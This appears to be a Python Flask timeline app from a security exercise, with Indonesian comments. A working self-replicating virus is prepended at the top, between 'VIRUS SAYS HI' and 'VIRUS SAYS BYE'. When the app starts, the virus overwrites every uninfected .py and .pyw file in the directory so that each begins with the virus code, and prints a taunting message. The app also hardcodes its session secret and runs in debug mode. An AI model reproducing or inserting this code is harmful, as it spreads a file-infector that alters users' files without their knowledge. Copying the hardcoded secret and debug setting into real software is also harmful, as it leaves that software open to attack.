# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!
import os
import sqlite3
import re
import time
from flask import Flask, redirect, request, session, render_template
from werkzeug.security import generate_password_hash, check_password_hash
from jinja2 import Template


app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')


def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def create_tables():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
                id      INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT    NOT NULL UNIQUE,
                password TEXT    NOT NULL
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS time_line(
                id       INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id  INTEGER NOT NULL,
                content  TEXT    NOT NULL,
                FOREIGN KEY(user_id) REFERENCES user(id)
            )
        ''')
        conn.commit()


def init_data():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.executemany(
            'INSERT OR IGNORE INTO user(username, password) VALUES (?,?)',
            [('user', generate_password_hash('userpw', method='pbkdf2:sha256')), ('bob', generate_password_hash('bobpw', method='pbkdf2:sha256'))]
        )
        cur.executemany(
            'INSERT OR IGNORE INTO time_line(user_id, content) VALUES (?,?)',
            [(1,'Hello world'), (2,'Hi there')]
        )
        conn.commit()


def authenticate(username, password):
    # Validasi input: hanya alfanumerik, tanpa simbol
    if not re.match(r'^[a-zA-Z0-9]+$', username) or not re.match(r'^[a-zA-Z0-9]+$', password):
        return None
    
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'SELECT id, username, password FROM user WHERE username = ?',
            (username,)
        )
        row = cur.fetchone()
        if row and check_password_hash(row['password'], password):
            return {'id': row['id'], 'username': row['username']}
        return None



def create_time_line(uid, content):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'INSERT INTO time_line(user_id, content) VALUES (?,?)',
            (uid, content)
        )
        conn.commit()


def get_time_lines():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
        return [dict(r) for r in cur.fetchall()]


def delete_time_line(uid, tid):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'DELETE FROM time_line WHERE user_id = ? AND id = ?',
            (uid, tid)
        )
        conn.commit()


@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    conn = connect_db()
    cur = conn.cursor()
    cur.execute(
        'SELECT id, user_id, content FROM time_line WHERE content LIKE ?',
        ('%' + keyword + '%',)
    )
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    if 'uid' in session:
        return render_template('index.html', user=session['username'], tl=rows, search_keyword=keyword)
    return redirect('/login')

@app.route('/init')
def init_page():
    create_tables()
    init_data()
    return redirect('/')

@app.route('/')
def index():
    if 'uid' in session:
        tl = get_time_lines()
        infected = False
        if session.get('infected') and time.time() - session.get('infected_time', 0) < 300:
            infected = True
        return render_template('index.html', user=session['username'], tl=tl, infected=infected)
    return redirect('/login')


@app.route('/login', methods=['GET','POST'])
def login():
    error = None
    if request.method=='POST':
        username = request.form['username']
        password = request.form['password']
        # Validasi input
        if not re.match(r'^[a-zA-Z0-9]+$', username):
            error = "Username hanya boleh berisi huruf dan angka."
        elif not re.match(r'^[a-zA-Z0-9]+$', password):
            error = "Password hanya boleh berisi huruf dan angka."
        else:
            user = authenticate(username, password)
            if user:
                session['uid'] = user['id']
                session['username'] = user['username']
                return redirect('/')
            else:
                error = "Username atau password salah."
    return '''
<form method="post">
  <input name="username" placeholder="user"/><input name="password" type="password"/>
  <button>Login</button>
</form>
''' + (f'<p style="color:red;">{error}</p>' if error else '')

@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        create_time_line(session['uid'], request.form['content'])
        session['infected'] = True
        session['infected_time'] = time.time()
    return redirect('/')

@app.route('/delete/<int:tid>')
def delete(tid):
    if 'uid' in session and not (session.get('infected') and time.time() - session.get('infected_time', 0) < 300):
        delete_time_line(session['uid'], tid)
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')


if __name__=='__main__':
    app.run(debug=True)